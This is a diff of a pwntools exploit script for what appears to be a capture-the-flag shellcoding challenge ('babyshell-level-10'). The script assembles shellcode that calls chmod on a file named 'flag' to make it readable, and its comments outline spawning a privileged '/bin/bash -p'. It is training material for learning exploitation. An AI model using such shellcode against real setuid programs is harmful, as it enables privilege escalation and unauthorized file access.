@@ -18,11 +18,11 @@ init-pwndbg
 continue
 '''.format(**locals())
 
-exe = './challenge/babyshell-level-8'
+exe = '/challenge/babyshell-level-10'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'debug'
+context.log_level = 'info'
 
 # ===========================================================
 #                           EXPLOIT
@@ -35,20 +35,20 @@ context.log_level = 'debug'
 # offset = find_offset(exe, cyclic(500))
 # win = elf.symbols['win']
 
-# chmod flag to allow reading
-# 6 is the permission flag
+# i think the program is broken?
+# only a portion of the resulting shellcode seems to be sorted
+# where the most important parts stays intact
 assembly = """
     push 0x67616c66
     push rsp
     pop rdi 
-
     push 6
     pop rsi
-
     push 90
     pop rax
     syscall
     """
+
 # Walkthrough of shellcode
 # First, push /bin/bash using several techniques.
 # Then nullify rdx and rax
@@ -56,9 +56,7 @@ assembly = """
 # Then, push the 'array' ["/bin/bash", "-p", 0], keep in mind that rsi and rdi holds pointers.
 # Then do syscall
 
-
 shellcode = asm(assembly)
-print(len(shellcode))
 print(shellcode)
 
 io = start()
